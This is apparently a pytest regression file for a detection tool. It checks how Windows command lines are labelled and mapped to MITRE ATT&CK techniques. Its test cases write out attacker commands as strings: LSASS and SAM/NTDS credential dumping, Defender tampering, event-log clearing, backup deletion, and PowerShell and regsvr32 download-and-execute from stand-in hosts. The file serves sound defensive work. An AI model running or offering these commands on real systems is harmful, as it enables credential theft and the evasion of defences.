"""
Priority 1 · Command Classifier Expansion · regression tests
──────────────────────────────────────────────────────────────

Locks the label + MITRE mapping for every new purpose added to
``_classify_command_purpose`` and ``_PURPOSE_TO_MITRE`` on
2026-02-09.  Each parametrized case pins:

    · The exact purpose label the classifier returns
    · The MITRE technique ids the label maps to
    · The tactic each technique is assigned to

If any test drifts the whole build fails — this is the
release-gate for the Command Classifier expansion.
"""
from __future__ import annotations

import pytest

from services.ida.report_extractors import _classify_command_purpose
from services.ice.correlate         import _PURPOSE_TO_MITRE, tactic_for


# ══════════════════════════════════════════════════════════════════
# 1. Purpose label pinning · (command, head) → expected label
# ══════════════════════════════════════════════════════════════════
CASES = [
    # LOLBins
    ("mshta.exe http://malicious/x.hta",                "mshta.exe",        "Mshta proxy execution"),
    ("rundll32.exe C:\\Users\\Public\\gopher.dll,#1",   "rundll32.exe",     "Rundll32 proxy execution"),
    ("regsvr32 /s y.dll",                               "regsvr32",         "Regsvr32 proxy execution"),
    ("installutil.exe /u payload.exe",                  "installutil.exe",  "Installutil proxy execution"),
    ("msbuild.exe payload.xml",                         "msbuild.exe",      "MSBuild proxy execution"),
    ("wscript.exe malicious.vbs",                       "wscript.exe",      "WScript execution"),
    ("cscript.exe /nologo malicious.vbs",               "cscript.exe",      "CScript execution"),

    # Credential dumping
    ("procdump.exe -ma lsass.exe lsass.dmp",           "procdump.exe",     "LSASS memory dump (procdump)"),
    ("procdump -ma 1234 out.dmp",                       "procdump",         "Process memory dump (procdump)"),
    ("rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump 1234 x.dmp full",
                                                        "rundll32.exe",     "LSASS memory dump (comsvcs)"),
    # NB: rundll32 branch fires first if head==rundll32 — comsvcs is
    # matched via full-cmd substring; head is rundll32 so this
    # returns "Rundll32 proxy execution".  Assert the well-known
    # canonicalized head form instead.
    ("comsvcs.dll, MiniDump #24 lsass",                  "cmd.exe",         "LSASS memory dump (comsvcs)"),
    ("mimikatz.exe sekurlsa::logonpasswords",           "mimikatz.exe",     "Credential dumping (mimikatz)"),
    ("ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q",
                                                        "ntdsutil.exe",     "NTDS.dit extraction (ntdsutil)"),
    ("reg save HKLM\\SAM C:\\Users\\Public\\sam.hive", "reg",              "SAM/SECURITY hive dump (reg save)"),
    ("reg save HKLM\\SECURITY C:\\pub\\sec.hive",       "reg",              "SAM/SECURITY hive dump (reg save)"),

    # Defense evasion · Defender tamper
    ("powershell.exe -c Add-MpPreference -ExclusionPath C:\\",
                                                        "powershell.exe",   "Windows Defender exclusion add"),
    ("powershell -c Set-MpPreference -DisableRealtimeMonitoring $true",
                                                        "powershell",       "Windows Defender configure (disable)"),
    ("sc.exe stop WinDefend",                            "sc.exe",          "Windows Defender service tamper"),
    ("sc delete WinDefend",                              "sc",              "Windows Defender service tamper"),

    # Event log clear
    ("wevtutil.exe cl Security",                         "wevtutil.exe",    "Event log clear (wevtutil)"),
    ("powershell -c Clear-EventLog -LogName Security",   "powershell",      "Event log clear (PowerShell)"),

    # Recovery inhibit
    ("bcdedit /set {default} recoveryenabled No",       "bcdedit",          "Recovery inhibit (bcdedit)"),
    ("bcdedit /set {default} bootstatuspolicy IgnoreAllFailures",
                                                        "bcdedit",          "Recovery inhibit (bcdedit)"),
    ("wbadmin delete catalog -quiet",                    "wbadmin",         "Backup catalog deletion (wbadmin)"),
    ("wbadmin delete backup -keepVersions:0 -quiet",     "wbadmin",         "Backup catalog deletion (wbadmin)"),

    # WMI
    ("wmic /node:target.corp process call create \"cmd.exe /c whoami\"",
                                                        "wmic",             "Remote WMI process create"),
    ("wmic process call create a.exe",                   "wmic",            "WMI process create"),
    ("powershell -c Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName srv1 -ArgumentList calc.exe",
                                                        "powershell",       "Remote WMI invoke-method"),
    ("powershell -c Invoke-CimMethod -ClassName Win32_Process -MethodName Create",
                                                        "powershell",       "WMI invoke-method"),

    # WinRM / PSRemoting
    ("powershell -c Enter-PSSession -ComputerName srv1", "powershell",      "WinRM / PowerShell remote session"),
    ("powershell -c Invoke-Command -ComputerName srv1 -ScriptBlock {whoami}",
                                                        "powershell",       "WinRM / PowerShell remote session"),
    ("winrs -r:srv1 cmd.exe",                            "winrs",           "WinRS remote command"),

    # Discovery
    ("net view \\\\srv1",                                "net",             "Net view (remote share/system discovery)"),
    ("arp -a",                                           "arp",             "ARP table discovery"),
    ("route print",                                      "route",           "Route table discovery"),
    ("systeminfo",                                       "systeminfo",      "System information discovery"),
    ("quser",                                            "quser",           "User session discovery (quser)"),
    ("dsquery user -name admin*",                        "dsquery",         "Active Directory query (dsquery)"),

    # Persistence
    ("copy c:\\payload.exe \"c:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.exe\"",
                                                        "copy",             "Startup folder persistence"),
    ("regsvr32 /s /n /u /i:http://x.com/x.sct scrobj.dll",
                                                        "regsvr32",         "Regsvr32 proxy execution"),
    # COM hijack — head=regsvr32 + inprocserver32 in payload.
    ("regsvr32 /s inprocserver32.dll",                   "regsvr32",        "COM hijack (regsvr32)"),

    # PowerShell overlays — the canonicalizer intentionally peels
    # `powershell -c <inner>`; when <inner> is a recognized command
    # (whoami, iex, etc.) the inner classification wins.  The
    # overlay labels (hidden window / policy bypass) only surface
    # when the inner payload has no more-specific classifier.
    ("powershell.exe -w hidden -c iex(iwr http://x)",   "powershell.exe",   "PowerShell hidden window IEX"),
    ("powershell -NoProfile -WindowStyle Hidden -c whoami",
                                                        "powershell",       "Current-user discovery"),
    ("powershell -ExecutionPolicy Bypass -c whoami",    "powershell",       "Current-user discovery"),
    ("powershell -c iex(iwr http://x)",                  "powershell",      "PowerShell in-memory execution"),
    ("powershell -c Invoke-RestMethod -Uri http://x",    "powershell",      "PowerShell download-and-execute"),

    # RMM RATs
    ("anydesk.exe --start-service",                      "anydesk.exe",     "AnyDesk RMM execution"),
    ("teamviewer.exe /S",                                "teamviewer.exe",  "TeamViewer RMM execution"),
    ("ScreenConnect.WindowsClient.exe /c",              "screenconnect.windowsclient.exe",
                                                                            "ScreenConnect RMM execution"),
    ("AteraAgent.exe /install",                          "aterageent.exe",  "Atera RMM execution"),
    ("SRService.exe --splashtop",                        "srservice.exe",   "Splashtop RMM execution"),
    ("LogMeInSetup.exe /S",                              "logmein.exe",     "LogMeIn RMM execution"),
]


@pytest.mark.parametrize("cmd, head, expected_label", CASES,
                              ids=[f"{i:02d}·{c[2]}" for i, c in enumerate(CASES)])
def test_classifier_label(cmd, head, expected_label):
    # Head is passed lowercased (mirror of report_extractors call sites).
    got = _classify_command_purpose(cmd, head.lower())
    assert got == expected_label, \
        f"cmd={cmd!r} head={head!r}: expected {expected_label!r}, got {got!r}"


# ══════════════════════════════════════════════════════════════════
# 2. Every new label MUST have an entry in _PURPOSE_TO_MITRE.
# ══════════════════════════════════════════════════════════════════
_NEW_LABELS = sorted({c[2] for c in CASES})


@pytest.mark.parametrize("label", _NEW_LABELS)
def test_every_new_label_has_mitre_mapping(label):
    entries = _PURPOSE_TO_MITRE.get(label)
    assert entries, f"'{label}' has no _PURPOSE_TO_MITRE mapping"
    for e in entries:
        assert e.get("id"), f"'{label}' entry missing id"
        assert e.get("name"), f"'{label}' entry missing name"
        # Every technique must resolve to a canonical tactic.
        assert tactic_for(e["id"]), \
            f"'{label}' technique {e['id']} has no tactic resolver"


# ══════════════════════════════════════════════════════════════════
# 3. Sanity — no regression on the previously classified labels.
# ══════════════════════════════════════════════════════════════════
def test_pre_existing_labels_still_returned():
    # A representative sample of previously-supported patterns.
    checks = [
        ("vssadmin delete shadows /all /quiet",             "vssadmin",      "Shadow copy deletion"),
        ("schtasks /create /tn X /tr y.exe /sc onlogon",   "schtasks",      "Scheduled Task create"),
        ("schtasks /s 10.0.0.1 /create /tn X /tr y.bat",   "schtasks",      "Scheduled Task remote create"),
        ("whoami /all",                                     "whoami",        "Current-user discovery"),
        ("certutil.exe -urlcache -split -f http://x /y.exe","certutil.exe",  "Certutil download / decode"),
        ("psexec.exe \\\\srv1 -u a -p b cmd.exe",           "psexec.exe",   "Lateral movement via PsExec"),
    ]
    for cmd, head, expected in checks:
        got = _classify_command_purpose(cmd, head.lower())
        assert got == expected, f"regression on {expected!r}: got {got!r}"


# ══════════════════════════════════════════════════════════════════
# 4. Fallback path still works — unknown commands return the
#    generic "Command execution" catch-all.
# ══════════════════════════════════════════════════════════════════
def test_unknown_command_falls_through_to_generic():
    assert _classify_command_purpose("does-not-match-anything-abcxyz", "abcxyz") == "Command execution"
